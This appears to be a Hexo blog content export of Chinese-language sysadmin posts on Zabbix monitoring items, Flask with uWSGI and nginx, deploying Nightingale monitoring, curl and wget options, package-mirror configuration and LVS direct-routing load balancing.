&quot;system.cpu.intr&quot;</code><br>在我们的agent端，也可以使用命令来查看<code>intr</code>的速率变化：<br>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-GPlXzIYx-1585805581972)(./assets/image-20200123124741825.png)]<br>　　我们继续来看我们的监控项：<br>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-lB2p5jCN-1585805581973)(./assets/image-20200123125254603.png)]<br>　　说了这么多，我们来简单定义一个：</p></blockquote></blockquote><h5 id="②-定义一个不带参数的监控项"><a href="#②-定义一个不带参数的监控项" class="headerlink" title="② 定义一个不带参数的监控项"></a>② 定义一个不带参数的监控项</h5><p><img src="https://img-blog.csdnimg.cn/20200402133840382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200402133857371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>　　设置完以后，点击更新，即可加入，并会自动跳转至下图页面：<br><img src="https://img-blog.csdnimg.cn/20200402133937484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>　　定义完成，我们回到所有主机，等待5秒，我们可以看到，我们node1节点后面的选项已经有变成绿色的了：</p><p><img src="https://img-blog.csdnimg.cn/20200402134004678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>　　我们也可以回到我们的仪表盘，可以看到，我们的监控项有一个处于启用状态：<br><img src="https://img-blog.csdnimg.cn/20200402134029558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123125947773.png"><br>　　那么，我们的数据在哪里呢？可以点击<code>最新数据</code>，把我们的slave1节点添加至主机，应用一下，就可以看到下面的状态了：<br><img src="https://img-blog.csdnimg.cn/20200402134054240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123130112477.png"><br>　　可以看到，我们还有一个图形页面，点进去则可以看图形的分布：<br><img src="https://img-blog.csdnimg.cn/20200402134110412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123131822463.png"><br>　　事实上，我们关注的指标有很多种，我们一一添加进来即可。<br>　　刚刚我们定义的监控项是很简单的，指定一个<code>key</code>即可，但是有些监控项是带有参数的，这样一来，我们的监控项就有更多的灵活性。接下来，我们来简单说明一个需要带参数的监控项：</p><h5 id="③-定义一个带参数的监控项"><a href="#③-定义一个带参数的监控项" class="headerlink" title="③ 定义一个带参数的监控项"></a>③ 定义一个带参数的监控项</h5><p><img src="https://img-blog.csdnimg.cn/20200402134131652.png" alt="20171202112221667-2119454107.png"><br>　　图中的<code>[]</code>就是需要参数的意思，里面的值即为参数，带<code>&lt;&gt;</code>为不可省略的。我们就以这个例子来说明：<br>　　<code>if</code>表示是接口名；<code>&lt;mode&gt;</code>表示是那种模式，包括但不限于：packets(包)、bytes(字节)、errors(错误)、dropped(丢包)、overuns等等（上述内容通过<code>ifconfig</code>查看）<br>　　我们来设置一下这个监控值：<br><img src="https://img-blog.csdnimg.cn/20200402134147983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123132214414.png"></p><p><img src="https://img-blog.csdnimg.cn/20200402134207550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123132253959.png"><br>　　同样的，我们也可以通过命令行来查看：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@zabbix-master ~]# zabbix_get -s 172.16.147.154 -p 10050 -k &quot;net.if.in[ens33,packets]&quot;</span><br><span class="line">1278209</span><br></pre></td></tr></table></figure><p>　　我们来看看网页的显示情况：检测中 —&gt; 最新数据 —&gt; Network Interface Stats(图形)<br><img src="https://img-blog.csdnimg.cn/20200402134232314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123133723547.pn"><br>Ps. 图形文字出现问题可以在windows中找到中文字体文件替换 /usr/share/zabbix/assets/fonts 中的字体文件。</p><h5 id="④-快速定义类似指标"><a href="#④-快速定义类似指标" class="headerlink" title="④ 快速定义类似指标"></a>④ 快速定义类似指标</h5><p>　　如果我们想要定义一个类似的指标，我们可以直接选择克隆，然后简单的修改一点点参数即可。<br>　　就以我们刚刚定义的<code>net.if.in[ens33,packets]</code>为例，如果我们想要在定义一个<code>out</code>的进行如下操作即可：<br><img src="https://img-blog.csdnimg.cn/20200402134325741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20171202112547292-1392248898.png"><br><img src="https://img-blog.csdnimg.cn/20200402134256240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123134149384.png"><br>　　如果我们要以字节为单位也要定义的话，进行同样的操作：<br><img src="https://img-blog.csdnimg.cn/20200402134348492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20171202112605448-457365913.pn"><br><img src="https://img-blog.csdnimg.cn/20200402134402359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123134403562.pn"><br>　　如果有需要的话也可以把byte再克隆成out。就不一一演示了~<br>　　可以看一下，我们现在已经定义的指标：<br><img src="https://img-blog.csdnimg.cn/20200402134418596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123134541412.png"><br>　　我们来到 检测中 —&gt; 最新数据，可以看到，我们定义的监控项都已经有值了：<br><img src="https://img-blog.csdnimg.cn/20200402134432313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123134622125.png"></p><h5 id="⑤-删除监控项"><a href="#⑤-删除监控项" class="headerlink" title="⑤ 删除监控项"></a>⑤ 删除监控项</h5><p>　　如果有一个监控项，我们用不上了，就可以删除掉。但是如果你直接删除的话，默认数据是会留下的，所以我们要先清除数据，然后再删除，具体操作步骤如下：<br>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-YIl9j9Vy-1585805581980)(./assets/1204916-20171202112656808-290199455.png)]</p><h5 id="⑥-监控项存储的值"><a href="#⑥-监控项存储的值" class="headerlink" title="⑥ 监控项存储的值"></a>⑥ 监控项存储的值</h5><p>　　对于监控项存储的值，老一点的版本只有以下三种方式：</p><ul><li>As is：不对数据做任何处理(存储的为原始值)</li><li>Delta：（simple change)(变化)，本次采样减去前一次采样的值的结果</li><li>Delta：（speed per second)(速率)，本次采样减去前一次采样的值，再除以经过的时长；<br>而在3.4版本以后有了更多的表现形式：<br><img src="https://img-blog.csdnimg.cn/20200402134451102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123135049140.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos7+python3-flask+uwsgi+nginx 环境配置记录</title>
      <link href="2020/12/04/centos7+python3-flask+uwsgi+nginx_%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%AE%B0%E5%BD%95/"/>
      <url>2020/12/04/centos7+python3-flask+uwsgi+nginx_%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="软件版本"><a href="#软件版本" class="headerlink" title="软件版本"></a>软件版本</h1><table><thead><tr><th>软件</th><th>版本</th></tr></thead><tbody><tr><td>centos</td><td>7.6-1810</td></tr><tr><td>python</td><td>3.6</td></tr><tr><td>uwsgi</td><td>编译安装-2.0.19</td></tr><tr><td>nginx</td><td>1.16.1</td></tr></tbody></table><h2 id="nginx-配置文件"><a href="#nginx-配置文件" class="headerlink" title="nginx 配置文件"></a>nginx 配置文件</h2><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">vim</span> /etc/nginx/conf.d/flask.conf</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">include</span> uwsgi_params;                       <span class="comment"># 导入uwsgi配置 </span></span><br><span class="line">        <span class="attribute">uwsgi_pass</span> <span class="number">127.0.0.1:5555</span>;                  <span class="comment"># 转发端口       uwsgi_param UWSGI_PYTHON /usr/bin/python3;  # Python解释器</span></span><br><span class="line">        <span class="attribute">uwsgi_param</span> UWSGI_CHDIR /opt/web;<span class="comment"># 项目根目录</span></span><br><span class="line">        <span class="attribute">uwsgi_param</span> UWSGI_SCRIPT manager:app;           <span class="comment"># 项目的主程序，比如</span></span><br><span class="line">你测试用run.py文件，文件中app = Flask(__name__)，那么这里就填run:app </span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="uwsgi配置文件"><a href="#uwsgi配置文件" class="headerlink" title="uwsgi配置文件"></a>uwsgi配置文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vim uwsgi.ini</span><br><span class="line"></span><br><span class="line">[uwsgi]</span><br><span class="line">socket &#x3D; 127.0.0.1:5555  # 服务端口</span><br><span class="line">processes &#x3D; 4    # 进程</span><br><span class="line">threads &#x3D; 2   # 线程</span><br><span class="line">wsgi-file &#x3D; &#x2F;opt&#x2F;web&#x2F;app.py  # 入口文件</span><br><span class="line">master &#x3D; true   # 允许主线程存在</span><br><span class="line">pythonpath &#x3D; &#x2F;opt&#x2F;web # 项目根路径</span><br><span class="line">module &#x3D; manager </span><br><span class="line">callable &#x3D; app </span><br><span class="line">memory-report &#x3D; true</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h2 id="nginx-管理"><a href="#nginx-管理" class="headerlink" title="nginx 管理"></a>nginx 管理</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx  # 启动</span><br><span class="line">nginx -s reload # 重新加载配置文件</span><br><span class="line">nginx -s stop # 关闭</span><br></pre></td></tr></table></figure><h2 id="uwsgi-管理"><a href="#uwsgi-管理" class="headerlink" title="uwsgi 管理"></a>uwsgi 管理</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uwsgi --ini 配置文件路径 -d # -d 为后台</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="uwsgi-安装"><a href="#uwsgi-安装" class="headerlink" title="uwsgi 安装"></a>uwsgi 安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里推荐两种方法</span><br><span class="line">1、 pip3 install uWSGI</span><br><span class="line"></span><br><span class="line">2、 编译安装</span><br><span class="line">wget http:&#x2F;&#x2F;projects.unbit.it&#x2F;downloads&#x2F;uwsgi-latest.tar.gz # 下载资源</span><br><span class="line"># 如果资源失效，下载以下</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1AVSF050ncKRCQ0E6Kj_cVQ </span><br><span class="line">提取码：eo9b </span><br><span class="line">复制这段内容后打开百度网盘手机App，操作更方便哦--来自百度网盘超级会员V4的分享</span><br><span class="line">tar xf uwsgi-latest.tar.gz # 解压文件,然后cd进去</span><br><span class="line">python3 uwsgiconfig.py --build  # 编译，需要gcc</span><br><span class="line">yum install -y gcc gcc-c++</span><br><span class="line">python3 setup.py install  # 安装</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> python </tag>
            
            <tag> 架构 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos7部署滴滴夜莺监控系统</title>
      <link href="2020/12/04/centos7%E9%83%A8%E7%BD%B2%E6%BB%B4%E6%BB%B4%E5%A4%9C%E8%8E%BA%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/"/>
      <url>2020/12/04/centos7%E9%83%A8%E7%BD%B2%E6%BB%B4%E6%BB%B4%E5%A4%9C%E8%8E%BA%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h3 id="夜莺github："><a href="#夜莺github：" class="headerlink" title="夜莺github："></a>夜莺github：</h3><p><code>https://github.com/didi/nightingale</code></p><h3 id="官方介绍："><a href="#官方介绍：" class="headerlink" title="官方介绍："></a>官方介绍：</h3><blockquote><p>Nightingale 是一套衍生自 Open-Falcon 的互联网监控解决方案，融入了部分滴滴生产环境的最佳实践，灵活易用，稳定可靠，是一个生产环境直接可用的版本 :-)</p></blockquote><h3 id="使用手册："><a href="#使用手册：" class="headerlink" title="使用手册："></a>使用手册：</h3><p><code>https://n9e.didiyun.com/</code></p><h3 id="详细部署过程"><a href="#详细部署过程" class="headerlink" title="详细部署过程"></a>详细部署过程</h3><h4 id="server端部署"><a href="#server端部署" class="headerlink" title="server端部署"></a>server端部署</h4><h5 id="部署docker"><a href="#部署docker" class="headerlink" title="部署docker"></a>部署docker</h5><blockquote><p>自行百度方法</p></blockquote><h5 id="下载docker-compose并执行"><a href="#下载docker-compose并执行" class="headerlink" title="下载docker-compose并执行"></a>下载docker-compose并执行</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/download/1.25.0-rc4/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line">chmod  +x  /usr/local/bin/docker-compos</span><br><span class="line">cd  nightingale-3.3.0/dockerfiles &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure><h5 id="安装完成后访问"><a href="#安装完成后访问" class="headerlink" title="安装完成后访问"></a>安装完成后访问</h5><p><img src="https://img-blog.csdnimg.cn/20201130091801257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>默认账号: root<br>默认密码: root.2020</p></blockquote><h4 id="agent端部署"><a href="#agent端部署" class="headerlink" title="agent端部署"></a>agent端部署</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://116.85.64.82/n9e.tar.gz </span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载资源，这是一个完整的代码包，我们只需要其中部分文件。</span></span><br><span class="line">mkdir data</span><br><span class="line">tar xf n9e.tar.gz -C data &amp;&amp; cd data</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目录结构如下：<br><img src="https://img-blog.csdnimg.cn/2020113009383625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>将 <strong>control</strong>、 <strong>n9e-agent</strong>、 <strong>etc/address.yml</strong>， <strong>/etc/agent.yml</strong>、 <strong>/etc/identity.yml</strong> 打包 拷贝到**/home/n9e/** 这个目录下，这里要注意目录结构，其中logs和meta是后续自动生成的。<br><img src="https://img-blog.csdnimg.cn/20201130094200971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h5 id="修改server端配置"><a href="#修改server端配置" class="headerlink" title="修改server端配置"></a>修改server端配置</h5><blockquote><p>编辑address.yml 将地址127.0.0.1 修改为主服务器端ip地址<br><img src="https://img-blog.csdnimg.cn/20201130094449905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h5 id="配置启动脚本"><a href="#配置启动脚本" class="headerlink" title="配置启动脚本"></a>配置启动脚本</h5><blockquote><p>在我们刚才解压开的目录中etc/service 下有agent.service 文件，将他拷贝到相应目录下</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp agent.service &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;</span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201130094803878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>启动成功后便可以开始检测了</p></blockquote><h5 id="检测安装"><a href="#检测安装" class="headerlink" title="检测安装"></a>检测安装</h5><p><img src="https://img-blog.csdnimg.cn/20201130094911318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201130094931418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> 监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 监控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http请求工具详解</title>
      <link href="2020/12/04/http%E8%AF%B7%E6%B1%82%E5%B7%A5%E5%85%B7%E8%AF%A6%E8%A7%A3/"/>
      <url>2020/12/04/http%E8%AF%B7%E6%B1%82%E5%B7%A5%E5%85%B7%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="curl使用方法"><a href="#curl使用方法" class="headerlink" title="curl使用方法"></a><center>curl使用方法</center></h2><table><thead><tr><th>参数</th><th>说明</th><th>例子</th></tr></thead><tbody><tr><td>-A</td><td>设置user-agent</td><td>curl -A “Chrome” <a href="http://www.baidu.com/">http://www.baidu.com</a></td></tr><tr><td>-X</td><td>用执行方法请求</td><td>curl -X POST <a href="http://httpbin.org/post">http://httpbin.org/post</a></td></tr><tr><td>-I</td><td>只返回请求的头信息</td><td>-d a=1 -d b=2 -d c=3<br>-d “a=1&amp;b=2&amp;c=3”<br>-d @filename</td></tr><tr><td>-O</td><td>下载文件并以远程文件名保存</td><td></td></tr><tr><td>-o</td><td>下载文件并以指定文件名保存</td><td>curl -o fox.png <a href="http://bin.org/image/png">http://bin.org/image/png</a></td></tr><tr><td>-L</td><td>跟随重定向请求</td><td>curl -IL <a href="https://baidu.com/">https://baidu.com</a></td></tr><tr><td>-H</td><td>设置头信息</td><td>curl -o image.webp -H “accept:image/webp” <a href="http://httpbin.org/image">http://httpbin.org/image</a></td></tr><tr><td>-k</td><td>允许发起不安全的ssl请求</td><td></td></tr><tr><td>-b</td><td>设置cookies</td><td>curl -b a=hello <a href="http://httpbin.org/cookies">http://httpbin.org/cookies</a></td></tr></tbody></table><h2 id="wget使用方法"><a href="#wget使用方法" class="headerlink" title="wget使用方法"></a><center>wget使用方法</center></h2><table><thead><tr><th>参数</th><th>说明</th><th>例子</th></tr></thead><tbody><tr><td>-O</td><td>以指定文件名保存下载文件</td><td>wget -O <a href="http://www.baidu.com/index.php">http://www.baidu.com/index.php</a></td></tr><tr><td>–limit-rate</td><td>以制定的速度下载文件</td><td>wget –limit-rate=500k</td></tr><tr><td>-c</td><td>断点续传</td><td></td></tr><tr><td>-b</td><td>后台下载</td><td></td></tr><tr><td>-U</td><td>设置User-Agent</td><td></td></tr><tr><td>–mirror</td><td>镜像下载某个网站</td><td></td></tr><tr><td>-p</td><td>下载页面中的所有相关资源</td><td></td></tr><tr><td>-r</td><td>递归下载所有网页中的链接</td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 开发 </tag>
            
            <tag> 网络请求 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 系统修改源信息</title>
      <link href="2020/12/04/linux_%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BF%AE%E6%94%B9%E6%BA%90/"/>
      <url>2020/12/04/linux_%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BF%AE%E6%94%B9%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<h1 id="centos修改yum源信息"><a href="#centos修改yum源信息" class="headerlink" title="centos修改yum源信息"></a>centos修改yum源信息</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak</span><br><span class="line">阿里云yum源</span><br><span class="line"><span class="meta">#</span><span class="bash"> CentOS 5</span></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo</span><br><span class="line"><span class="meta">#</span><span class="bash"> CentOS 6</span></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br><span class="line"><span class="meta">#</span><span class="bash"> CentOS 7</span></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">阿里云epel</span><br><span class="line"><span class="meta">#</span><span class="bash">epel(RHEL 7)</span></span><br><span class="line">wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo</span><br><span class="line"><span class="meta">#</span><span class="bash">epel(RHEL 6)</span></span><br><span class="line">wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-6.repo</span><br><span class="line"><span class="meta">#</span><span class="bash">epel(RHEL 5)</span></span><br><span class="line">wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-5.repo</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="ubuntu-修改apt源"><a href="#ubuntu-修改apt源" class="headerlink" title="ubuntu 修改apt源"></a>ubuntu 修改apt源</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 将原文件备份</span></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure><h1 id="修改kali-的-apt源"><a href="#修改kali-的-apt源" class="headerlink" title="修改kali 的 apt源"></a>修改kali 的 apt源</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">kali官方源</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"><span class="meta">#</span><span class="bash">中科大的源</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><br><span class="line"><span class="meta">#</span><span class="bash">阿里云源</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/kali-security/ kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali-security/ kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lvs四层负载均衡之dr模式详解</title>
      <link href="2020/12/04/lvs%E5%9B%9B%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B9%8Bdr%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/"/>
      <url>2020/12/04/lvs%E5%9B%9B%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B9%8Bdr%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">直接路由(Direct routing)模式（LVS-DR）</span><br><span class="line">    原理：负载均衡器和RS都使用同一个IP对外服务｡但只有DR对ARP请求进行响应,所有RS对本身这个IP的ARP请求保持静默｡也就是说,网关会把对这个服务IP的请求全部定向给DR,而DR收到数据包后根据调度算法,找出对应的RS,把目的MAC地址改为RS的MAC（因为IP一致）并将请求分发给这台RS｡这时RS收到这个数据包,处理完成之后，由于IP一致，可以直接将数据返给客户，则等于直接从客户端收到这个数据包无异,处理后直接返回给客户端｡</span><br><span class="line">    优点：和TUN（隧道模式）一样，负载均衡器也只是分发请求，应答包通过单独的路由方法返回给客户端。与VS-TUN相比，VS-DR这种实现方式不需要隧道结构，因此可以使用大多数操作系统做为物理服务器。</span><br><span class="line">    缺点：（不能说缺点，只能说是不足）要求负载均衡器的网卡必须与物理网卡在一个物理段上。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200212010458905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>实验说明：<br>1.网络使用NAT模式<br>2.DR模式要求Director DIP 和 所有RealServer RIP必须在同一个网段及广播域<br>3.所有节点网关均指定真实网关                         